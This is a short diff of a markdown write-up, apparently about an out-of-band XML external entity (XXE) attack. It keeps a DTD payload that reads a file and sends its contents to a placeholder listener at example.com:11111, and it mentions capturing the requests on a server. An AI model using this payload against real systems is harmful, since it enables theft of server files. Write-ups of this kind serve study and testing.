@@ -20,8 +20,7 @@ following setup. (I'll use example.com below instead of the real server.)
 
 
 ```
-https://example.com/foo.dtd:
-
+# https://example.com/foo.dtd
 <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://example.com:11111/?%file;'>">%start;
 ```
 
@@ -39,8 +38,6 @@ and send this to the website:
 <email>"</email>
 </form>
 ```
-
-The <email> part is not even needed I guess.
 
 I can listen to the incoming requests in my server with:
 ```
